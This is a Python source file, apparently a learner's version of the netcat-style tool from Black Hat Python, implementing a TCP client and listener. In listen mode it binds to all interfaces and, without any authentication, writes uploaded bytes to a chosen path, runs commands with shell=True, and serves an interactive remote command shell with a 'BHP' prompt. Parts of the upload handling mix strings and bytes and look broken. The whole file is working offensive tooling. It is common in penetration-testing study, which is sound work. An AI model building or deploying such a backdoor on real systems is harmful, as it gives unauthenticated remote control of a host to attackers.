#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Dec 28 16:59:31 2017

@author: shabbirkagalwala
"""
import sys
import socket
import threading
import subprocess
import argparse

# define some global variables
listen             = False
command            = False
upload             = False
execute            = ""
target             = ""
upload_destination = ""
port               = 0

def run_command(command):
    # trim the newline
    command = command.rstrip()
    # run the command and get the output back
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    # send the output back to the client
    return output


# this is for incoming connections
def server_loop():
    global target
    global port
    
    # if no target is defined we listen on all interfaces
    if not target:
        target = "0.0.0.0"
        
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((target,port))
        
    server.listen(5)        
        
    while True:
        client_socket, addr = server.accept()
        # spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()

# this handles incoming client connections
def client_handler(client_socket):
    global upload
    global execute
    global command
        
    # check for upload
    if upload_destination:
        
        # read in all of the bytes and write to our destination
        file_buffer = ""
        
        # keep reading data until none is available
        recv_len = 1
        while recv_len:
            data = client_socket.recv(1024)
            recv_len = len(data)
            file_buffer += data

            if recv_len < 1024:
                break                
        # now we take these bytes and try to write them out
        try:
            with open(upload_destination,"wb") as file_descriptor:
                file_descriptor.write(file_buffer)
                file_descriptor.close()
            
            # acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
                                
        # check for command execution
    if execute:
        # run the command
        output = run_command(execute)
        client_socket.send(output.encode())
        
    # now we go into another loop if a command shell was requested
    if command:
        while True:
            # show a simple prompt
            client_socket.send("<BHP:#>".encode())
            # now we receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer +=client_socket.recv(1024).decode()
            # we have a valid command so execute it and send back the results
            response = run_command(cmd_buffer)
            if type(response) != bytes:
               response=response.encode()
            # send back the response
            client_socket.send(response)


# if we don't listen we are a client....make it so.
def client_sender(buffer): 
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    try:
        # connect to our target host
        client.connect((target,port))
        # if we detect input from stdin send it 
        # if not we are going to wait for the user to punch some in
        print('connected to %s:%d'%(target,port))
        if buffer:
            client.send(buffer.encode())
        while True:
            # now wait for data back
            recv_len = 1
            response = ""
            while recv_len:
                data     = client.recv(4096).decode()
                recv_len = len(data)
                response+= data
        
                if recv_len < 4096:
                    break
            print(response)
            # wait for more input
            buffer = input("")
            buffer += "\n"                        
            # send it off
            client.send(buffer.encode())
    except Exception as e:
        print("[*] Exception! Exiting.")
        print(e)
                
        # teardown the connection                  
        client.close() 
        
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
        
    parser = argparse.ArgumentParser()

    parser.add_argument("-t", "--target", help="target host")
    parser.add_argument("-p", "--port", help="target port", type=int)
    parser.add_argument("-l", "--listen", help="listen on [host]:[port] for incoming connections", action="store_true")
    parser.add_argument("-e", "--execute", help="execute the given file upon receiving a connection")
    parser.add_argument("-c", "--command", help="initialize a new command shell", action=
    "store_true")
    parser.add_argument("-u", "--upload_destination", help="upon receiving connection upload a file and write to [destination]")

    # read commandline options
    args = parser.parse_args()

    listen = args.listen
    port = args.port
    execute = args.execute
    command = args.command
    upload_destination = args.upload_destination
    target = args.target

    # are we going to listen or just send data from stdin
    if not listen and target and port > 0:
                
        # read in the buffer from the commandline
        # this will block, so send CTRL-D if not sending input
        # to stdin
        buffer = sys.stdin.read()
        # send data off
        client_sender(buffer)   
        
        # we are going to listen and potentially 
        # upload things, execute commands and drop a shell back
        # depending on our command line options above
    if listen:
        server_loop()

main()
